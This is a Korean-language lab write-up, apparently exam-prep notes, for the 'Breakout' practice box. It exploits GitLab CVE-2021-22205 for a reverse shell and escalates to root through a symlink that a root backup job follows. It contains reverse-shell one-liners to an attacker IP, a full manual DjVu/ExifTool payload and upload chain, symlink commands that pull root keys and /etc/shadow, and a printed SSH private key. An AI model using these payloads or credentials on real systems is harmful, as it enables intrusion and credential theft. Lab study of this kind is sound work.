2. **링크는 따라가는 쪽의 권한·네임스페이스에서 해석된다.** 컨테이너 안 `git` 이 만든 링크를, 호스트의 root 프로세스가 열면 → 호스트의 `/root/.ssh/id_rsa` 가 열린다.
3. **`zip` 은 기본적으로 심링크를 따라가서 대상의 "내용"을 저장한다.** 링크 자체를 보존하려면 `-y`(`--symlinks`)를 명시해야 하는데, 백업 스크립트는 대개 그걸 안 쓴다.

이 셋이 겹치면 **저권한 사용자가 root만 읽을 수 있는 임의 파일을 아카이브 밖으로 빼낸다.**

원문의 링크 생성:

root key 심볼릭링크 생성
```bash
git@breakout:/var/log/gitlab/gitaly$ ln -s /root/.ssh/id_rsa keykey
ln -s /root/.ssh/id_rsa keykey
git@breakout:/var/log/gitlab/gitaly$ ls -al
ls -al
total 244
drwx------  2 git  root   4096 Aug 18 05:55 .
drwxr-xr-x 20 root root   4096 Mar  3  2022 ..
-rw-r--r--  1 root root  35381 Mar  3  2022 @4000000062225c4419243204.u
-rw-r--r--  1 root root   6348 Mar  4  2022 @400000006a83e2bc1d93f3ec.u
lrwxrwxrwx  1 root root     32 Mar  3  2022 config -> /opt/gitlab/sv/gitaly/log/config
-rw-r--r--  1 root root   6215 Aug 18 05:42 current
-rw-r--r--  1 git  git       0 Mar  3  2022 gitaly_hooks.log
-rw-r--r--  1 git  git  173449 Aug 18 06:16 gitaly_ruby_json.log
-rw-r--r--  1 git  git    7695 Aug 18 04:52 gitaly_ruby_json.log.1.gz
lrwxrwxrwx  1 git  git      17 Aug 18 05:55 keykey -> /root/.ssh/id_rsa
-rw-------  1 root root      0 Mar  3  2022 lock
```

#### 이 `ls -al` 에서 읽어야 할 4가지

| 줄 | 의미 |
|---|---|
| `drwx------ 2 git root .` | 디렉터리 소유자가 `git` → **내가 여기에 파일을 만들 수 있다.** 권한상승의 전제 조건 |
| `lrwxrwxrwx ... config -> /opt/gitlab/sv/gitaly/log/config` | 이미 심링크가 존재한다. "이 디렉터리를 다루는 도구는 심링크에 익숙하다"는 신호 — 아카이버가 링크를 걸러내지 않을 가능성이 높다 |
| `lrwxrwxrwx 1 git git 17 keykey -> /root/.ssh/id_rsa` | 길이 17 = `/root/.ssh/id_rsa` 의 문자 수. 심링크 크기는 대상 경로 문자열의 길이다. 대상 파일 크기가 아니다 |
| `@4000000062225c44...` 파일명 | TAI64N 타임스탬프. runit/`svlogd` 가 로그를 로테이트할 때 붙이는 이름 — GitLab Omnibus 임을 재확인 |

심링크 권한이 `lrwxrwxrwx` 인 것에 속지 마라. **심링크 자체의 퍼미션은 아무 의미가 없다** — 접근 판정은 항상 대상 파일의 퍼미션으로 이뤄진다.

#### 링크는 "누구의 세계"에서 해석되는가

같은 링크가 읽는 주체에 따라 **전혀 다른 파일**을 가리킨다. 이 표가 이 박스 권한상승의 전부다.

| 링크를 읽는 주체 | `/root/.ssh/id_rsa` 가 실제로 가리키는 것 | 결과 |
|---|---|---|
| 컨테이너 안의 `git` | 컨테이너 이미지의 `/root/.ssh/id_rsa` | 대개 없음. 있어도 쓸모없음 |
| 호스트의 root 백업 프로세스 | 호스트의 `/root/.ssh/id_rsa` | **root 개인키 유출** ← 이 박스 |
| 칼리에서 `unzip` 한 나 | 이미 파일 내용이 아카이브에 박혀 있음 | 링크 해석 자체가 불필요 |

**"내가 만든 링크를 내가 읽을 필요가 없다."** 만드는 쪽과 읽는 쪽이 다르다는 것이 이 기법의 핵심이고, 컨테이너 경계는 그 비대칭을 극단적으로 키운다.

#### 심링크 계열 기법의 계보

같은 원리의 변형들이다. 크론/백업/로그 처리를 만나면 이 목록에서 고른다:

| 기법 | 조건 | 얻는 것 |
|---|---|---|
| 아카이브 심링크 추종 (이 박스) | 내가 쓸 수 있는 디렉터리가 백업 대상 + 아카이버가 링크 추종 | 임의 파일 읽기 |
| 심링크로 쓰기 리다이렉트 | 특권 프로세스가 내 디렉터리의 파일에 쓴다 | 임의 파일 쓰기 → `/etc/passwd`, `authorized_keys`, cron |
| 로그 파일 심링크 (logrotate 계열) | 로그 경로를 내가 제어 | 특권 쓰기 |
| 심링크 레이스 (TOCTOU) | 특권 프로세스가 검사 후 사용까지 틈이 있다 | 검사 우회 |
| 와일드카드 인젝션 | `tar cf x.tar *` / `chown -R * ` 처럼 `*` 를 쓰는 크론 | 옵션으로 해석되는 파일명을 심어 명령 실행 |
| 하드링크 SUID | `fs.protected_hardlinks=0` + 같은 파일시스템 | 권한 우회 |

리눅스는 이 계열을 막으려고 sysctl 보호를 넣어뒀다:

```bash
sysctl fs.protected_symlinks fs.protected_hardlinks   # 보통 1
```

> [!warning] `fs.protected_symlinks=1` 인데 왜 이 공격이 통했나
> 이 보호는 **누구나 쓸 수 있는 sticky 디렉터리(`/tmp` 같은)에서, 링크 소유자와 사용자가 다를 때**만 링크 추종을 막는다.
> `/var/log/gitlab/gitaly` 는 `git` 소유의 일반 디렉터리(0700) 이지 world-writable sticky 디렉터리가 아니다. 그래서 보호 대상이 아니다.
> **"sysctl이 켜져 있으니 심링크 공격은 안 된다"는 잘못된 안심**이다. 조건을 정확히 알아야 한다.

### 2-B-3. 왜 이 "페이로드"인가

이 단계의 페이로드는 명령 한 줄이지만, 각 선택에 이유가 있다.

```bash
ln -s /root/.ssh/id_rsa keykey
```

| 조각 | 역할 | 다른 선택은 왜 안 되나 |
|---|---|---|
| `ln -s` | 심볼릭 링크 | `ln`(하드링크)은 파일시스템 경계를 못 넘고, 소유권/권한을 그대로 물려받아 읽지도 못한다. 게다가 컨테이너-호스트 경계에서는 아예 불가 |
| 절대 경로 `/root/...` | 링크를 읽는 프로세스의 루트(=호스트 root fs) 기준으로 해석됨 | 상대 경로면 아카이브 안 위치 기준이라 엉뚱한 곳을 가리킨다 |
| `/root/.ssh/id_rsa` | 재사용 가능한 인증 수단. 얻는 즉시 SSH로 완전한 root 셸 | `/etc/shadow` 는 크랙이 필요하고 시간이 든다. `/root/proof.txt` 는 플래그만 얻고 셸은 못 얻는다 |
| 대상 디렉터리 `/var/log/gitlab/gitaly` | **git 소유 + 백업 대상 + 이미 심링크 존재** 3박자 | 다른 GitLab 로그 디렉터리는 root 소유라 쓰기 불가 |
| 파일명 `keykey` | 눈에 띄지 않는 임의 이름 | 기존 파일명을 덮으면 서비스가 깨져 탐지된다 |

#### 한 번에 여러 개를 심어라 — 재시도 비용이 크다

백업 주기를 모르면 **한 사이클을 놓칠 때마다 통째로 기다려야 한다.** 그러니 첫 시도에 후보를 전부 건다:
```bash
ln -s /root/.ssh/id_rsa      k1
ln -s /root/.ssh/id_ed25519  k2
ln -s /root/proof.txt        k3
ln -s /etc/shadow            k4
ln -s /root/.bash_history    k5
```
대상이 없으면 아카이버가 그 항목만 건너뛴다. **비용이 0에 가까운 보험**이다.

---

### 2-B-4. 이 체인이 성립한 전제 5가지 — 하나라도 깨지면 실패한다

권한상승을 "운 좋게 됐다"로 남기면 재사용이 안 된다. **어떤 조건이 모여서 성립했는지**를 분해해두면, 다음 박스에서 어느 조건을 확인해야 하는지가 곧바로 체크리스트가 된다.

| # | 전제 | 이 박스에서의 근거 | 깨졌다면 |
|---|---|---|---|
| 1 | 컨테이너 안에서 쓰기 가능한 디렉터리가 있다 | `drwx------ 2 git root /var/log/gitlab/gitaly` — 소유자 `git` | 다른 git 소유 디렉터리 탐색(`find / -user git -type d -writable`) |
| 2 | 그 디렉터리가 호스트와 공유된다 | `mount` 의 `/dev/sda2 on /var/log/gitlab` | 컨테이너 탈출 자체를 다른 각도로(`docker.sock`, capability, `--privileged`) |
| 3 | 호스트의 특권 프로세스가 그 디렉터리를 읽는다 | `/opt/backups/log_backup.zip` 의 존재와 갱신 | 크론이 없으면 이 경로 자체가 없다 → 다른 privesc |
| 4 | 그 프로세스가 심링크를 추종한다 | `unzip` 출력의 **`inflating: ... keykey`** | `linking:` 이면 와일드카드 인젝션으로 전환 |
| 5 | 산출물을 내가 읽을 수 있다 | `coaran` 으로 `/opt/backups/log_backup.zip` 접근 성공 | 읽기 불가면 링크 대상을 `/root/proof.txt` 로 바꿔도 소용없다 |

#### 이 5줄이 그대로 열거 명령이 된다

```bash
# 1) 내가 쓸 수 있는 곳
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev|run|tmp)'
# 2) 호스트와 공유되는 곳
mount | grep -vE 'proc|sysfs|cgroup|tmpfs|devpts'
# 3) 특권 프로세스가 건드리는 곳
cat /etc/crontab; ls -la /etc/cron.d/; systemctl list-timers --all; ./pspy64 -pf
# 4) 아카이버의 옵션
grep -rE 'zip|tar|rsync|cp ' /etc/cron* /opt /root/*.sh 2>/dev/null
# 5) 산출물 접근성
ls -la /opt /backup* /var/backups 2>/dev/null
```
**1과 2의 교집합**이 이 계열 권한상승의 후보 목록이다. 이 교집합이 비면 다른 경로를 찾아야 한다 — 여기서 시간을 아낀다.

---

## 3. Foothold — CVE-2021-22205

### 3-1. PoC 확보와 검토

웹에서 PoC 검색
https://github.com/inspiringz/CVE-2021-22205

> [!danger] ⚠️ 시험 규칙 — PoC 스크립트는 허용, "자동 익스플로잇 프레임워크"는 금지
> OSCP가 금지하는 것은 스스로 취약점을 발견해 자동으로 익스플로잇하는 도구(`sqlmap`·`sqlninja`·`db_autopwn`·`browser_autopwn`)와 대량 취약점 스캐너(Nessus 등)다. **Metasploit·`meterpreter`는 금지가 아니라 1대 한정**이고, AutoRecon은 열거 전용이라 허용된다.
> **특정 CVE의 단일 PoC 스크립트는 허용된다.** 다만 두 가지를 지켜야 한다:
> 1. **실행 전에 반드시 코드를 읽어라.** 남의 스크립트가 무엇을 어디로 보내는지 모르고 돌리면, 시험장에서 타겟을 망가뜨리거나(파괴적 페이로드) 리포트를 못 쓴다.
> 2. **PoC가 하는 일을 `curl` 로 재현할 수 있어야 한다.** 스크립트가 깨졌을 때(파이썬 버전·라이브러리·타임아웃) 손으로 복구할 수 있는 사람만 시험을 통과한다.
>
> `msfconsole` 의 `exploit/multi/http/gitlab_exif_rce` 로도 뚫리지만, 그건 1대 한정 카드를 여기에 태우는 것이다. 이 정도로 쉬운 박스에 쓰지 마라.

PoC가 내부적으로 하는 일은 3단계다:

| 단계 | 요청 | 목적 |
|---|---|---|
| ① | `GET /users/sign_in` | 응답 HTML의 `<meta name="csrf-token" content="...">` 와 `_gitlab_session` 쿠키 확보 |
| ② | `POST /uploads/user` (multipart, `file=@out.jpg`, `X-CSRF-Token:` 헤더) | 인증 없이 악성 이미지 업로드 → 서버가 ExifTool 호출 → 코드 실행 |
| ③ | 리스너에서 셸 수신 | — |

#### CSRF 토큰이 필요한데 "인증 없음"이 맞나

맞다. **CSRF 토큰은 인증이 아니다.** 세션이 없는 익명 방문자도 폼을 쓰려면 토큰을 받는다. GitLab은 익명 세션에도 토큰을 발급한다.
그래서 `GET /users/sign_in` 한 번으로 토큰+쿠키를 얻고 그대로 업로드하면 된다. **"토큰이 있으니 인증된 것"이라고 착각하지 마라** — 시험에서 이 구분을 못 하면 pre-auth 표면을 통째로 놓친다.

### 3-2. 실행

```bash
┌──(kali㉿kali)-[~/PG/Breakout/CVE-2021-22205]
└─$ python CVE-2021-22205.py -u http://192.168.243.182 -m rev 192.168.45.207 4444
===> Reverse Shell Mode

[*] command: bash -i >& /dev/tcp/192.168.45.207/4444 0>&1
[!] Error: request timeout(10)
```

플래그 해설:

| 플래그 | 의미 | 빼면 |
|---|---|---|
| `-u http://192.168.243.182` | 타겟 베이스 URL | 필수. 스킴(`http://`)을 빼면 요청 조립이 깨진다 |
| `-m rev` | 리버스셸 모드(다른 모드: `check`, `cmd`) | 기본 모드는 명령 1회 실행. 지속 셸을 못 얻는다 |
| `192.168.45.207 4444` | 내 VPN IP 와 리스너 포트 | 여기에 `tun0` 가 아닌 `eth0` IP를 넣는 실수가 가장 흔하다. `ip a show tun0` 로 확인 |

> [!danger] 리스너를 먼저 띄우고 익스플로잇을 쏴라
> 순서가 바뀌면 셸이 나갔다가 `Connection refused` 로 죽는다. 그리고 **재시도 비용이 크다** — 매번 새 파일을 업로드해야 하고, 타겟에 흔적이 쌓인다.
> ```bash
> # 터미널 1 (먼저)
> rlwrap nc -lnvp 4444
> # 터미널 2 (나중)
> python CVE-2021-22205.py -u http://TARGET -m rev <tun0 IP> 4444
> ```

### 3-3. 셸 수신

리버스셸 연결 및 flag 확인
```bash
┌──(kali㉿kali)-[~/PG/Breakout]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.243.182] 54756
bash: cannot set terminal process group (320): Inappropriate ioctl for device
bash: no job control in this shell
git@breakout:~/gitlab-workhorse$ whoami
whoami
git
git@breakout:~/gitlab-workhorse$
```

> [!warning] `[!] Error: request timeout(10)` — 에러가 실패를 뜻하지 않는다
> PoC는 타임아웃 에러를 뱉었는데 **셸은 붙었다.** 이유는 명확하다: 페이로드가 `bash -i >& /dev/tcp/...` 를 포그라운드로 실행하므로 ExifTool 프로세스가 리턴하지 않고, 따라서 GitLab이 HTTP 응답을 못 준다. 셸이 살아 있는 동안 HTTP 요청은 영원히 대기한다.
> 즉 이 타임아웃은 **성공의 증상**이다.
>
> 이 볼트에 누적 중인 **"응답이 성공을 뜻하지 않는다"**([[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]]) 패턴의 역방향 사례다. 정리하면:
> **"HTTP 응답과 익스플로잇 성공은 독립 사건이다. 판정은 반드시 리스너에서 하라."**

`nc` 관련 플래그:

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-l` | 리슨 모드 | 필수 |
| `-n` | DNS 역질의 안 함 | 접속 시 수 초 지연. 랩 환경에서는 항상 붙인다 |
| `-v` | 접속 로그 출력 | `connect to ... from ...` 줄이 안 나와 붙었는지 모른다 |
| `-p 4444` | 포트 지정 | — |
| `rlwrap` | readline 래핑 | 방향키·히스토리·백스페이스가 죽는다. 반쪽 TTY에서 필수 |

#### 셸 잡자마자 칠 것 — 이 박스에서 실제로 필요했던 순서

```bash
id; whoami; hostname
python3 -c 'import pty;pty.spawn("/bin/bash")'   # 없으면 script -qc /bin/bash /dev/null
export TERM=xterm
cat /proc/1/cgroup; ls -la /.dockerenv           # ← 컨테이너 판별 (이 박스의 분기점)
mount | grep -vE 'proc|sys|cgroup'               # ← 바인드 마운트 찾기
ls -la ~; find / -name 'id_rsa*' -o -name '*.pem' 2>/dev/null
sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*
```
`bash: no job control in this shell` 은 **TTY가 아직 반쪽**이라는 뜻이다. `Ctrl+C` 를 누르면 셸이 통째로 죽으니 업그레이드 전까지 조심한다.

### 3-4. 수동 대안 — PoC 없이 같은 결과 만들기

> [!note] `[미실행 — 절차만]` 아래 블록은 원문 기록에 없는 **재현용 절차**다. 이 박스에서 실제로 돌린 것은 위의 PoC다.

`djvulibre-bin`(`bzz`, `djvumake`)과 `exiftool` 이 필요하다.

```bash
# ① ExifTool이 임의 바이너리를 EXIF에 싣게 하는 설정
cat > exploit.config <<'EOF'
%Image::ExifTool::UserDefined = (
    'Image::ExifTool::Exif::Main' => {
        0xc51b => { Name => 'HasselbladExif', Writable => 'string', WriteGroup => 'IFD0' },
    },
);
EOF

# ② DjVu 주석에 Perl 코드를 심는다  ( \c 가 취약 분기 트리거 )
echo -n '(metadata "\c${system('"'"'bash -c "bash -i >& /dev/tcp/LHOST/443 0>&1"'"'"');}")' > payload.txt
bzz payload.txt payload.bzz

# ③ ANT 청크로 DjVu 조립
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz

# ④ JPEG 안에 DjVu를 실어 위장
exiftool -config exploit.config '-HasselbladExif<=exploit.djvu' out.jpg
```

업로드는 `curl` 두 방이면 된다:

```bash
# CSRF 토큰 + 세션 쿠키
TOKEN=$(curl -s -c cj.txt http://TARGET/users/sign_in \
        | grep -oP 'name="csrf-token" content="\K[^"]+' | head -1)

# 인증 없이 업로드 → 서버가 ExifTool 호출 → RCE
curl -s -b cj.txt -H "X-CSRF-Token: $TOKEN" \
     -F "file=@out.jpg" \
     http://TARGET/uploads/user
```

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-c cj.txt` / `-b cj.txt` | 쿠키 저장 / 전송 | 세션과 CSRF 토큰이 짝이라 어긋나면 422 |
| `-H "X-CSRF-Token: ..."` | CSRF 검증 통과 | 422 Unprocessable Entity |
| `-F "file=@out.jpg"` | multipart 업로드. `@` 가 파일 내용 첨부 | `@` 없으면 파일명 문자열만 전송된다 |
| `grep -oP '...\K[^"]+'` | `\K` 로 앞부분을 매칭에서 제외 | 토큰 앞에 `content="` 가 붙어 헤더가 깨진다 |

취약 여부만 비파괴적으로 판정하려면 **명령 대신 지연**을 쓴다 — [[Hawat]]의 time-based와 같은 발상이다:

```
(metadata "\c${system('sleep 15');}")
```

응답이 15초 늦으면 취약하다. **리버스셸을 쏘기 전에 취약 여부부터 확정**하는 것이 시험장에서 시간을 아끼는 방식이다.

---

## 4. 권한상승

두 단계다. **`git`(컨테이너) → `coaran`(호스트) → `root`(호스트).**

### 4-1. `git` → `coaran` — 방치된 개인키 (수평 이동)

backups 내부에서 key 획득
```bash
git@breakout:~/backups$ cat mykey
cat mykey
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

#### 키의 마지막 줄에 주인 이름이 적혀 있다

OpenSSH 개인키 포맷은 끝에 **comment 필드**를 평문(base64 내부)으로 담는다. 마지막 줄의
```
AAAA D2NvYXJhbkBicmVha291dA==
```
에서 `Y29hcmFuQGJyZWFrb3V0` 를 base64 디코드하면 **`coaran@breakout`** 이다.

즉 **키를 주웠으면 사용자명을 추측할 필요가 없다.** 즉시 확인하는 두 가지 방법:
```bash
ssh-keygen -y -f mykey            # 공개키 재생성 → 끝에 주석 표시
ssh-keygen -l -f mykey            # 지문 + 주석
strings mykey | base64 -d 2>/dev/null | strings | tail -3
```
`/home/*/.ssh/authorized_keys` 를 읽을 수 있다면 지문 대조로 확정할 수도 있다.

여기서 **1장의 API 열거가 값을 한다.** `coaran` 이라는 이름을 이미 봤기 때문에 "GitLab 사용자 = 리눅스 사용자"라는 연결이 즉시 성립한다. 열거를 건너뛰었다면 이 키의 주인을 찾느라 시간을 태웠을 것이다.

gitlab api를 통해 획득한 유저 `coaran` 으로 ssh 접근
```bash
┌──(kali㉿kali)-[~/PG/Breakout]
└─$ chmod 600 key

┌──(kali㉿kali)-[~/PG/Breakout]
└─$ ssh -i key coaran@192.168.243.182
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 18 Aug 2026 05:48:57 AM UTC

  System load:  0.05              Processes:                318
  Usage of /:   89.8% of 9.78GB   Users logged in:          0
  Memory usage: 81%               IPv4 address for docker0: 172.17.0.1
  Swap usage:   4%                IPv4 address for ens160:  192.168.243.182

  => / is using 89.8% of 9.78GB


39 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


*** System restart required ***

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

coaran@breakout:~$ cat local.txt
75c6c158473b5125a2662cc9fdaa4ba6
```

> [!danger] `chmod 600` 을 빼면 SSH가 키를 거부한다
> ```
> Permissions 0644 for 'key' are too open.
> It is required that your private key files are NOT accessible by others.
> This private key will be ignored.
> ```
> 그리고 SSH는 키를 무시한 뒤 **비밀번호를 묻는다.** 그래서 "키가 틀렸나?"로 오진하기 쉽다.
> **키를 저장했으면 반사적으로 `chmod 600`.** 클립보드로 옮길 때 줄바꿈·공백이 깨지면 `error in libcrypto` / `invalid format` 이 나오므로, 가능하면 `scp`·`base64 -w0` 로 옮긴다.

이 SSH 로그인 배너에서 얻는 정보도 그냥 넘기지 않는다:

| 줄 | 의미 |
|---|---|
| `Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic)` | **nmap의 MikroTik 추정이 오탐이었음을 확정.** 커널 5.4.0-90 → 커널 익스플로잇 후보 검토 가능 |
| `IPv4 address for docker0: 172.17.0.1` | 호스트에 도커가 돈다. GitLab이 컨테이너라는 2-B 가설과 정확히 맞물린다 |
| `Usage of /: 89.8% of 9.78GB` | 디스크가 거의 찼다. 큰 파일 쓰기(백업 복사 등)가 실패할 수 있다 |
| `* System restart required *` · `39 updates` | 패치 미적용 — 로컬 커널/패키지 취약점 가능성 |

> [!note] `** WARNING: connection is not using a post-quantum key exchange algorithm.`
> **취약점 신호가 아니다.** 최신 OpenSSH 클라이언트가 서버(8.2p1)에 PQ 키교환이 없다고 알리는 정보성 경고다. 무시해도 된다.

### 4-2. `coaran` → `root` — 백업 작업의 심링크 추종

호스트에 올라온 뒤 `/opt/backups` 에 로그 백업 아카이브가 있다. **2-B 에서 심어둔 `keykey` 링크가 여기에 실려 나온다.**

> [!warning] 원문에 `/opt/backups` 를 발견한 열거 과정이 빠져 있다
> 기록에는 `unzip` 부터 나온다. 이 노트를 다음에 쓰는 사람을 위해 **무엇을 쳤으면 찾았을지**를 남긴다:
> ```bash
> ls -la /opt /srv /backup* 2>/dev/null           # 비표준 최상위 디렉터리부터
> cat /etc/crontab; ls -la /etc/cron.d /etc/cron.*/
> systemctl list-timers --all
> find / -name '*.zip' -newermt '-1 day' 2>/dev/null
> ./pspy64                                        # ← 백업 주기·명령줄을 그대로 본다
> ```
> **`pspy` 가 이 유형의 정답 도구다.** 크론이 root로 무엇을 어떤 옵션으로 도는지(`zip -r ... /srv/gitlab/logs`)를 눈으로 확인하면, 심링크가 통할지 와일드카드가 통할지 추측 없이 결정된다.

그 후 압축 해제
```bash
coaran@breakout:/opt/backups$ unzip log_backup.zip -d /tmp/
Archive:  log_backup.zip
   creating: /tmp/srv/gitlab/logs/gitaly/
  inflating: /tmp/srv/gitlab/logs/gitaly/gitaly_ruby_json.log
  inflating: /tmp/srv/gitlab/logs/gitaly/current
 extracting: /tmp/srv/gitlab/logs/gitaly/lock
   creating: /tmp/srv/gitlab/logs/gitlab-rails/
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/gitlab-rails-db-migrate-2022-03-03-18-31-56.log
   creating: /tmp/srv/gitlab/logs/gitlab-shell/
   creating: /tmp/srv/gitlab/logs/postgresql/
  inflating: /tmp/srv/gitlab/logs/postgresql/current
 extracting: /tmp/srv/gitlab/logs/postgresql/lock
   creating: /tmp/srv/gitlab/logs/reconfigure/
  inflating: /tmp/srv/gitlab/logs/reconfigure/1646332280.log
   creating: /tmp/srv/gitlab/logs/redis/
  inflating: /tmp/srv/gitlab/logs/redis/current
 extracting: /tmp/srv/gitlab/logs/redis/lock
   creating: /tmp/srv/gitlab/logs/sshd/
  inflating: /tmp/srv/gitlab/logs/sshd/current
 extracting: /tmp/srv/gitlab/logs/sshd/lock
 extracting: /tmp/srv/gitlab/logs/gitaly/gitaly_hooks.log
  inflating: /tmp/srv/gitlab/logs/gitlab-rails/application_json.log
  inflating: /tmp/srv/gitlab/logs/gitlab-rails/auth.log
  inflating: /tmp/srv/gitlab/logs/gitlab-rails/application.log
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/grpc.log
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/service_measurement.log
  inflating: /tmp/srv/gitlab/logs/gitlab-rails/production_json.log
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/sidekiq_client.log
  inflating: /tmp/srv/gitlab/logs/gitlab-rails/production.log
 extracting: /tmp/srv/gitlab/logs/gitlab-rails/exceptions_json.log
  inflating: /tmp/srv/gitlab/logs/gitlab-rails/api_json.log
   creating: /tmp/srv/gitlab/logs/alertmanager/
   creating: /tmp/srv/gitlab/logs/gitlab-exporter/
  inflating: /tmp/srv/gitlab/logs/gitlab-exporter/current
 extracting: /tmp/srv/gitlab/logs/gitlab-exporter/lock
   creating: /tmp/srv/gitlab/logs/gitlab-workhorse/
  inflating: /tmp/srv/gitlab/logs/gitlab-workhorse/current
 extracting: /tmp/srv/gitlab/logs/gitlab-workhorse/lock
   creating: /tmp/srv/gitlab/logs/logrotate/
 extracting: /tmp/srv/gitlab/logs/logrotate/current
 extracting: /tmp/srv/gitlab/logs/logrotate/lock
   creating: /tmp/srv/gitlab/logs/nginx/
 extracting: /tmp/srv/gitlab/logs/nginx/current
 extracting: /tmp/srv/gitlab/logs/nginx/gitlab_error.log
 extracting: /tmp/srv/gitlab/logs/nginx/error.log
 extracting: /tmp/srv/gitlab/logs/nginx/lock
